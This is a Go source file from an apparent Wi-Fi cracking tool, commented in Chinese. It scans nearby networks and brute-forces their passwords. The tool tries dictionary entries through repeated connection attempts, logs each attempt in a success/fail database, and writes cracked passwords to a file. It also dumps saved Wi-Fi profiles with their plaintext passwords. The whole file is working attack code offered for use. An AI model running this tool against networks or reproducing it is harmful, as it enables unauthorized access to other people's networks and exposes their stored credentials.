package wifi

import (
	"fmt"
	"log"
	"sort"
	"time"

	"github.com/projectdiscovery/gologger"
	"github.com/yearnming/wifi/pkg/scanpasswd"
	"github.com/yearnming/wifi/pkg/setting"
	"github.com/yearnming/wifi/pkg/util"
)

var failDB *util.DB // 包内全局

// SetFailDB 由 main 注入
func SetFailDB(db *util.DB) {
	failDB = db
}

// CrackWiFi 破解单个 Wi-Fi 网络
func RunCrack(start time.Time, opt *Options) error {
	return runWithNetworkList(start, opt, func(nets []Network) []Network {
		gologger.Info().Msgf("扫描到以下 Wi-Fi 网络:")
		for i, net := range nets {
			// gologger.Info().Msgf("%d. %s (信号: %d%%)", i+1, net.SSID, net.Signal)
			fmt.Printf("index: %d, 信号: %d%%, BSSID: %s, SSID: %s\n\n", i+1, net.Signal, net.BSSID, net.SSID)
		}
		gologger.Info().Msgf("请输入要破解的 Wi-Fi 编号: ")
		var index int
		fmt.Scanln(&index)
		if index < 1 || index > len(nets) {
			gologger.Error().Msgf("选择无效")
			return nil
		}
		return []Network{nets[index-1]}
	})
}

// CrackMultipleWiFis 破解多个指定 Wi-Fi 网络
func RunMulti(start time.Time, opt *Options) error {
	return runWithNetworkList(start, opt, func(nets []Network) []Network {
		// 1. 打印列表
		for i, net := range nets {
			fmt.Printf("index: %d, 信号: %d%%, BSSID: %s, SSID: %s\n\n", i+1, net.Signal, net.BSSID, net.SSID)
		}

		// 2. 读用户输入
		gologger.Info().Msgf("请输入要破解的 Wi-Fi 编号（支持 1,3,5 或 1-3,5）：")
		var line string
		fmt.Scanln(&line)

		// 3. 解析编号
		idxs, err := util.ParseIndexes(line, len(nets))
		if err != nil {
			gologger.Error().Msgf("输入格式错误: %v", err)
			return nil
		}

		// 4. 挑出对应网络
		var selected []Network
		for _, idx := range idxs {
			selected = append(selected, nets[idx-1])
		}
		gologger.Info().Msgf("已选择 %d 个 Wi-Fi", len(selected))
		return selected
	})
}

// AutoCrackWiFis 自动破解 Wi-Fi 列表 按信号强度排序
func RunAuto(start time.Time, opt *Options) error {
	return runWithNetworkList(start, opt, func(nets []Network) []Network {
		sort.Slice(nets, func(i, j int) bool { return nets[i].Signal > nets[j].Signal })
		gologger.Info().Msgf("自动模式：按信号强度排序，共 %d 个 Wi-Fi", len(nets))
		return nets
	})
}

// TrySavedPasswords 仅验证“探测到且已保存”的 Wi-Fi
func TrySavedPasswords() error {
	// ① 探测当前环境 Wi-Fi
	detected, err := GetWIFINetworks()
	if err != nil {
		return fmt.Errorf("扫描失败: %w", err)
	}
	if len(detected) == 0 {
		gologger.Info().Msgf("周围没有可验证的 Wi-Fi")
		return nil
	}
	// 做成 Set 方便快速查找
	detectedSet := make(map[string]struct{}, len(detected))
	for _, n := range detected {
		detectedSet[n.SSID] = struct{}{}
	}

	// ② 读取系统已保存的 profile
	profiles, err := scanpasswd.ListProfiles()
	if err != nil {
		return fmt.Errorf("读取已保存网络失败: %w", err)
	}

	// ③ 交集验证
	var needTest []scanpasswd.Profile
	for _, p := range profiles {
		if p.Error != nil || p.Password == "" {
			continue // 跳过异常/开放网络
		}
		if _, ok := detectedSet[p.SSID]; ok {
			needTest = append(needTest, p)
		}
	}
	if len(needTest) == 0 {
		gologger.Info().Msgf("没有“已保存+有密码+当前可见”的 Wi-Fi")
		return nil
	}

	gologger.Info().Msgf("即将验证 %d 个 Wi-Fi 的保存密码...", len(needTest))
	for _, prof := range needTest {
		gologger.Info().Msgf("验证 [%s] ...密码 [%s]", prof.SSID, prof.Password)
		wc := New(prof.SSID, prof.Password) // 你的连接对象
		// DefaultConnectTimeout = 4 * time.Second
		stat, err := wc.Connect()
		if err != nil {
			gologger.Error().Msgf("❌ [%s] 密码失效 (%v)", prof.SSID, err)
			// failDB.AddFail(prof.SSID, prof.Password)
			continue
		}
		if stat == Connected {
			gologger.Info().Msgf("✅ [%s] 密码正确，可正常连接", prof.SSID)
			// failDB.AddSuccess(prof.SSID, prof.Password)
		} else {
			gologger.Error().Msgf("❌ [%s] 状态异常 (%s)", prof.SSID, stat)
			// failDB.AddAbnormal(prof.SSID, prof.Password)
		}
		// 清理配置文件，避免残留
		// _ = wc.DeleteProfile()
	}
	return nil
}

func ShowSaved() error {
	list, err := scanpasswd.ListProfiles()
	if err != nil {
		gologger.Error().Msgf("密码获取错误：%v", err)
		log.Fatal(err)
	}
	for i, p := range list {
		if p.Error != nil {
			gologger.Info().Msgf("%2d. %-30s  [err: %v]\n", i+1, p.SSID, p.Error)
		} else if p.Password == "" {
			gologger.Info().Msgf("%2d. %-30s  <open>\n", i+1, p.SSID)
		} else {
			gologger.Info().Msgf("%2d. %-30s  %s\n", i+1, p.SSID, p.Password)
		}
	}
	return nil
}

// CrackOne：破解单个 Wi-Fi（无 filedb 逻辑）
func CrackOne(net Network, dict []string, start time.Time) error {

	// 如果库里有成功密码，先只验证它
	if succList := failDB.GetSuccess(net.SSID); len(succList) > 0 {
		gologger.Info().Msgf("【%s】发现历史成功密码，优先验证", net.SSID)
		for _, pwd := range succList {
			gologger.Info().Msgf("重试成功密码: %s", pwd)
			wc := New(net.SSID, pwd)
			stat, err := wc.Connect()
			if err == nil && stat == Connected {
				gologger.Info().Msgf("✅ 历史密码仍有效，跳过爆破")
				_ = util.WriteToFile(setting.SuccessPwdSavePath,
					fmt.Sprintf("WiFi: %s, password: %s\n", net.SSID, pwd))
				return nil
			}
			// 历史密码失效 → 把它从 success 移到 failed，继续正常爆破
			failDB.MoveSuccessToFailed(net.SSID, pwd)
			gologger.Info().Msgf("历史密码失效，转入爆破流程")
		}
	}

	// ① 过滤字典
	avail := failDB.FilterFresh(net.SSID, dict) // 只留“从未试过”的密码
	if len(avail) == 0 {
		gologger.Info().Msgf("【%s】所有密码均已失败/异常/成功，跳过", net.SSID)
		return nil
	}

	ssid := net.SSID
	gologger.Info().Msgf("开始破解 Wi-Fi: %s", ssid)

	for idx, pwd := range avail {
		counter := idx + 1
		now := time.Now()

		fmt.Printf("---------- 第 %d 次尝试 ----------\n", counter)
		gologger.Info().Msgf("测试密码: %s", pwd)

		wc := New(ssid, pwd)

		stat, err := wc.Connect()
		if err != nil {
			gologger.Error().Msgf("连接失败: %s, 状态: %s", err, stat)
			_ = wc.DeleteProfile()
			failDB.AddAbnormal(ssid, pwd)
			continue
		}
		// switch ClassifyResult(stat) { // 你前面写的归类函数
		// case "success":
		// 	failDB.AddSuccess(ssid, pwd)
		// case "abnormal":
		// 	failDB.AddAbnormal(ssid, pwd)
		// case "failed":
		// 	failDB.AddFail(ssid, pwd)
		// }
		if stat == Connected {
			gologger.Info().Msgf("✅ 成功连接 %s : %s", ssid, pwd)
			_ = util.WriteToFile(setting.SuccessPwdSavePath,
				fmt.Sprintf("WiFi: %s, password: %s\n", ssid, pwd))
			failDB.AddSuccess(ssid, pwd)
			return nil
		}

		_ = wc.DeleteProfile()
		gologger.Info().Msgf("总计时间: %s, 本轮耗时: %s",
			time.Since(start).Truncate(time.Second),
			time.Since(now).Truncate(time.Second))
		failDB.AddFail(ssid, pwd)
	}

	return fmt.Errorf("所有密码均失败")
}

// 公共流程：获取网络列表 → 处理列表 → 破解
func runWithNetworkList(start time.Time, opt *Options, processor func([]Network) []Network) error {
	networks, err := GetWIFINetworks()
	if err != nil {
		gologger.Error().Msgf("获取 WiFi 列表失败: %v", err)
		return err
	}
	if len(networks) == 0 {
		gologger.Info().Msgf("未扫描到任何 Wi-Fi 网络")
		return nil
	}

	toCrack := processor(networks)
	for _, net := range toCrack {
		gologger.Info().Msgf("正在尝试破解: %s (信号: %d%%)", net.SSID, net.Signal)
		if err := CrackOne(net, opt.WifiDict, start); err != nil {
			gologger.Error().Msgf("破解 %s 失败: %v", net.SSID, err)
		}
	}
	return nil
}
